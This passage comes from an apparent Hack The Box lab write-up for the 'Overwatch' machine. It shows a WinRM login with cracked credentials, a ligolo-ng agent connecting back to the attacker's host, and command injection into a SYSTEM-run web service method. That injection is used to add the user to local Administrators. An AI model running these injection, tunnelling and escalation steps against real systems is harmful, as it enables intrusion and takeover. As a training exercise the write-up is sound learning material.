+SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.81   445    S200401          [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx</code></pre><p>This user is now compromised!</p><p><img src="images/overwatch/pasted-image-20260810172817.webp" alt="Screenshot" loading="lazy" /></p><p>This user is apart of the remote managment users group which means i can get access over WINRM</p><h2>Evil-Winrm access as <code>sqlmgmt</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i s200401.overwatch.htb -u sqlmgmt -p &#39;bIhBbzMMnB82yx&#39;     
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt;</code></pre><p>I now have access</p><h2>Domain Admin</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\&gt; netstat -ano | findstr &quot;LISTENING&quot;
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       684
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       924
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       684
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       684
+  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       924
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       684
+  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       684
+  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       684
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       392
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:6520           0.0.0.0:0              LISTENING       3120
+  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2988
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       684
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       548
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1200
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1672
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2080
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       684
+  TCP    0.0.0.0:55826          0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:56084          0.0.0.0:0              LISTENING       3120
+  TCP    0.0.0.0:59048          0.0.0.0:0              LISTENING       684
+  TCP    0.0.0.0:59049          0.0.0.0:0              LISTENING       2916
+  TCP    0.0.0.0:59052          0.0.0.0:0              LISTENING       668
+  TCP    0.0.0.0:59056          0.0.0.0:0              LISTENING       684
+  TCP    0.0.0.0:59143          0.0.0.0:0              LISTENING       3020
+  TCP    10.129.244.81:53       0.0.0.0:0              LISTENING       1392
+  TCP    10.129.244.81:139      0.0.0.0:0              LISTENING       4
+
+...[SNIP]...</code></pre><p>Looks like there is an internal service running on port 8000, its also running as SYSTEM context as seen by the <code>4</code></p><p>There doesnt looks to be anything in <code>inetpub</code> containing any html</p><h3>Internal web service</h3><p>Ive downloaded the latest linux proxy and windows agent from the ligolo-ng github</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo ./proxy -selfcert</code></pre><p>Ill start up the proxy on my attacker machine</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ligolo-ng » ifcreate --name overwatch
+INFO[0013] Creating a new overwatch interface...        
+INFO[0013] Interface created!                           
+ligolo-ng » route_add --name overwatch --route 240.0.0.1/32
+INFO[0044] Route created.</code></pre><p>Then ill add the routing info</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Temp&gt; upload agent.exe
+                                        
+Info: Uploading /home/kali/htb/overwatch/agent.exe to C:\Temp\agent.exe
+                                        
+Data: 9800360 bytes of 9800360 bytes copied
+                                        
+Info: Upload successful!</code></pre><p>Then ill upload the agent to the target</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Temp&gt; .\agent.exe -connect 10.10.14.61:11601 --ignore-cert
+agent.exe : time=&quot;2026-08-10T09:45:04-07:00&quot; level=warning msg=&quot;warning, certificate validation disabled&quot;
+    + CategoryInfo          : NotSpecified: (time=&quot;2026-08-1...ation disabled&quot;:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+time=&quot;2026-08-10T09:45:04-07:00&quot; level=info msg=&quot;Connection established&quot; addr=&quot;10.10.14.61:11601&quot;</code></pre><p>Then ill execute the agent to connect back to me</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ligolo-ng » INFO[0126] Agent joined.                                 id=a2dead425dd3 name=&quot;OVERWATCH\\sqlmgmt@S200401&quot; remote=&quot;10.129.244.81:55864&quot;
+ligolo-ng » 
+ligolo-ng » session
+? Specify a session : 1 - OVERWATCH\sqlmgmt@S200401 - 10.129.244.81:55864 - a2dead425dd3
+[Agent : OVERWATCH\sqlmgmt@S200401] » tunnel_start --tun overwatch
+INFO[0250] Starting tunnel to OVERWATCH\sqlmgmt@S200401 (a2dead425dd3) 
+[Agent : OVERWATCH\sqlmgmt@S200401] »</code></pre><p>Then a second later i get the connection, then i can select the session then start the tunnel</p><p>I believe this is a web service that is actually running the exe i found earlier in the <code>software$</code> SMB share</p><p>I think this becuase there is an exectable installed on the system called nssm</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Software\Monitoring&gt; dir -force ../../&quot;Program Files&quot;
+
+
+    Directory: C:\Program Files
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         5/16/2025   4:06 PM                Common Files
+d-----         5/16/2025   4:35 PM                Internet Explorer
+d-----         5/16/2025   5:31 PM                Microsoft
+d-----         5/16/2025   5:35 PM                Microsoft Analysis Services
+d-----         5/16/2025   5:31 PM                Microsoft SQL Server
+d-----         5/16/2025   5:31 PM                Microsoft Visual Studio 10.0
+d-----         5/16/2025   5:31 PM                Microsoft.NET
+d-----          5/8/2021   1:20 AM                ModifiableWindowsApps
+d-----         5/16/2025   8:11 PM                nssm-2.24
+d--h--         5/16/2025   4:06 PM                Uninstall Information
+d-----         5/16/2025   4:06 PM                VMware
+d-----          5/8/2021   2:34 AM                Windows Defender
+d-----        12/31/2025  11:17 PM                Windows Defender Advanced Threat Protection
+d-----         5/16/2025   4:35 PM                Windows Mail
+d-----         5/16/2025   4:35 PM                Windows Media Player
+d-----          5/8/2021   2:34 AM                Windows NT
+d-----         5/16/2025   4:35 PM                Windows Photo Viewer
+d--hs-          5/8/2021   1:34 AM                Windows Sidebar
+d--h--         1/20/2026   6:27 AM                WindowsApps
+d-----          5/8/2021   1:34 AM                WindowsPowerShell
+-a-hs-          5/8/2021   1:18 AM            174 desktop.ini
+
+
+*Evil-WinRM* PS C:\Software\Monitoring&gt;</code></pre><p><code>nssm</code> has the purpose of making executable files into a full on service, so this makes me think that the service being ran is the <code>overwatch.exe</code> from earlier</p><p>Now taking a look at that exe from earlier once again</p><p><img src="images/overwatch/pasted-image-20260810182421.webp" alt="Screenshot" loading="lazy" /></p><p>I might be able to do command injection using <code>KillProcess</code></p><p>Similar to how it would work on a linux system, <code>&amp;&amp; whoami</code>, i should be able to embed an alternate command in there. And since this is running as system it will execute the command with system privileges</p><p><img src="images/overwatch/pasted-image-20260810183302.webp" alt="Screenshot" loading="lazy" /></p><p>This is the endpoing ill be making the request to, only in my case ill be using <code>240.0.0.1</code> as the host since i forwarded the service externally</p><h3>Command execution</h3><p>So for some reason this is not working over the tunnel i have on ligolo, so ill try this on localhost</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Software\Monitoring&gt; $client = New-WebServiceProxy -Uri http://localhost:8000/MonitorService?wsdl -Namespace &quot;WcfProxy&quot;</code></pre><p>First ill make a variable and set the uri to the correct endpoint, this command basically allows me to communicate with the service</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Software\Monitoring&gt; $client.KillProcess(&quot;x;whoami;#&quot;)
+nt authority\system</code></pre><p>Then simply calling the variable with the vulnerable function, i can get command execution</p><p>the <code>x</code> is a placeholder for the process name the semi colon simply allows me to run another command then using <code>#</code> i can comment out all other parts of the command</p><p><img src="images/overwatch/pasted-image-20260810192955.webp" alt="Screenshot" loading="lazy" /></p><p>This is the part of the command, that i am abusing, im placing <code>x</code> as the processName then using <code>;</code> to execute another command like <code>whoami</code> then using hashtag to commend out the remainder <code>-Force</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Software\Monitoring&gt; $client.KillProcess(&quot;x;net localgroup Administrators sqlmgmt /add;#&quot;)
+The command completed successfully.</code></pre><p>So ill add the current user to the administrators group</p><p>Then when i close the session and re open it:</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i s200401.overwatch.htb -u sqlmgmt -p &#39;bIhBbzMMnB82yx&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt;</code></pre><p>Domain Admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-support/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Support</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-store/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Store</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
